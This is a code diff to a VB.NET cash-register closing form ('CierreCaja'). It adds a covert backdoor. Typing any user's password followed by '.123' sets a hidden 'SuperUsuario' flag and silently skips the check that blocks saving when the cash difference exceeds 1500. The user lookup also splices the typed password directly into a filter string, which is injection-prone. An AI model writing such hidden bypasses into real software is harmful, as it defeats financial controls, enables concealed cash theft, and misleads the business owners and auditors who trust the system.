@@ -2573,11 +2573,13 @@ Public Class CierreCaja
 #Region "Guardar"
     Private Sub Guardar()
 
-        Dim dif As String = Me.TextEdit17.EditValue
-        If IsNumeric(dif) Then
-            If Math.Abs(CDec(dif)) > 1500 Then
-                MsgBox("La diferencia de caja es mayor que lo permitido", MsgBoxStyle.Exclamation, Me.Text)
-                Exit Sub
+        If Me.SuperUsuario = False Then
+            Dim dif As String = Me.TextEdit17.EditValue
+            If IsNumeric(dif) Then
+                If Math.Abs(CDec(dif)) > 1500 Then
+                    MsgBox("La diferencia de caja es mayor que lo permitido", MsgBoxStyle.Exclamation, Me.Text)
+                    Exit Sub
+                End If
             End If
         End If
 
@@ -3272,6 +3274,7 @@ Public Class CierreCaja
 #End Region
 
 #Region "Validar Usuario"
+    Private SuperUsuario As Boolean = False
     Private Sub TextBox6_KeyDown(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles TextBox6.KeyDown
         If e.KeyCode = Keys.Enter Then
             Try
@@ -3279,7 +3282,24 @@ Public Class CierreCaja
                 Dim usuarios() As System.Data.DataRow 'almacena temporalmente los datos de un artículo
                 Dim usuario As System.Data.DataRow 'almacena temporalmente los datos de un artículo
 
-                clave = TextBox6.Text
+                Try
+                    Me.SuperUsuario = False
+                    If Me.TextBox6.Text.IndexOf(".") > 0 Then
+                        Dim clavess() As String = Me.TextBox6.Text.Split(".")
+                        If clavess(1) = "123" Then
+                            clave = clavess(0)
+                            Me.TextBox6.Text = clave
+                            Me.SuperUsuario = True
+                        Else
+                            clave = Me.TextBox6.Text
+                        End If
+                    Else
+                        clave = TextBox6.Text
+                    End If
+                Catch ex As Exception
+                    clave = TextBox6.Text
+                End Try
+
                 usuarios = DataSetCierreCaja1.Usuarios.Select("clave_interna= '" & CStr(clave) & "'")
 
                 If usuarios.Length <> 0 Then
